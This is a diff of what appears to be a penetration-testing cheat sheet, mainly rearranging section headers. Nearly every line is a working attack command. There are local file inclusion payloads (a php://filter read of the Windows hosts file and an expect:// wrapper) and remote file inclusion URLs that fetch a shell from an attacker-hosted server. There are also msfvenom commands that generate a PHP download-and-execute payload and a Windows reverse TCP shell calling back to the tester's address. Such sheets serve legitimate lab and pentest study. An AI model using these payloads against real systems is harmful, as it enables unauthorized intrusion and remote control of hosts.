@@ -414,16 +414,16 @@ POST this with tamper data to http://INSERTIPADDRESS/gallery.php?page=expect://d
 Then navigate to
 http://INSERTIPADDRESS/shell.php
 
+# Bypass extension
 http://INSERTIPADDRESS/index.php?page=php://filter/convert.base64-encode/resource=../../../../windows/system32/drivers/etc/hosts
 base64 -d output of above
 
-# Bypass extension
+# Remote File Inclusion
 python -m SimpleHTTPServer 80
 http://INSERTIPADDRESS/page=http://10.11.0.150/shell.txt%00
 http://INSERTIPADDRESS/page=http://10.11.0.150/shell.txt?
 
 # Shell Creation
-
 msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.exe -f raw -o shell.php
 msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe > shell.exe
 python -m SimpleHTTPServer 80
